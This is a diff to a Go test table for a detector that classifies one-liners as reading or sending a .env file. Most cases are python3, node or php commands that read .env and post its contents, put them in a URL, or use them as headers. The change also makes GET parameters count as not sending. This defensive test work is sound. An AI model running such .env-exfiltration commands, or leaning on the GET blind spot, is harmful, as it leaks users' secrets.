@@ -510,13 +510,20 @@ func TestFileReadsScriptSends(t *testing.T) {
 		{`python3 -c "requests.post(url, headers={'X-D': open('.env').read()})"`, []string{"sent:.env"}},
 		{`php -r 'curl_setopt($ch, CURLOPT_URL, "https://x.example/?d=" . file_get_contents(".env"));'`, []string{"sent:.env"}},
 		{`python3 -c "requests.post(url, json={'token': open('.env').read()})"`, []string{"sent:.env"}},
+		// A body field written with _ is data, whatever it is called.
+		{`python3 -c "requests.post(url, json={'access_token': open('.env').read()})"`, []string{"sent:.env"}},
+		{`node -e 'fetch(url, {method: "POST", body: JSON.stringify({my_api_key: fs.readFileSync(".env", "utf8")})})'`, []string{"sent:.env"}},
 		// What a call that authenticates with a credential returns is its response, not the
 		// credential: forwarding it sends no file.
 		{`python3 -c "k = open('.env').read().strip(); r = requests.get('https://api.example', headers={'Authorization': k}); requests.post(hook, json=r.json())"`, []string{".env"}},
 		{`node -e 'const k = fs.readFileSync(".env", "utf8"); fetch(url, {headers: {Authorization: k}}).then(res => fetch(hook, {method: "POST", body: res.body}))'`, []string{".env"}},
-		// A GET sends its URL parameters and other headers.
-		{`python3 -c "requests.get(url, params={'d': open('.env').read()})"`, []string{"sent:.env"}},
-		{`python3 -c "k = open('.env').read(); r = requests.get(url, headers={'A': k})"`, []string{"sent:.env"}},
+		{`python3 -c "k = open('.env').read(); r = requests.get(url, auth=('me', k)); requests.post(hook, json=r.json())"`, []string{".env"}},
+		// Headers built before the call hold a credential too, not data.
+		{`python3 -c "k = open('.env').read().strip(); headers = {'Authorization': 'Bearer ' + k}; requests.post(url, headers=headers, json={'q': 1})"`, []string{".env"}},
+		{`node -e 'const k = fs.readFileSync(".env", "utf8"); const headers = {Authorization: k}; fetch(url, {method: "POST", headers, body: "{}"})'`, []string{".env"}},
+		{`python3 -c "k = open('.env').read(); headers = {'A': k}; requests.post(url, headers=headers)"`, []string{"sent:.env"}},
+		// A GET is not followed as a call that sends: neither its parameters nor a dict's .get.
+		{`python3 -c "k = open('.env').read().strip(); requests.get('https://api.example', params={'api_key': k})"`, []string{".env"}},
 		{`python3 -c "c = json.load(open('.env')); print(c.get('k'))"`, []string{".env"}},
 	})
 }
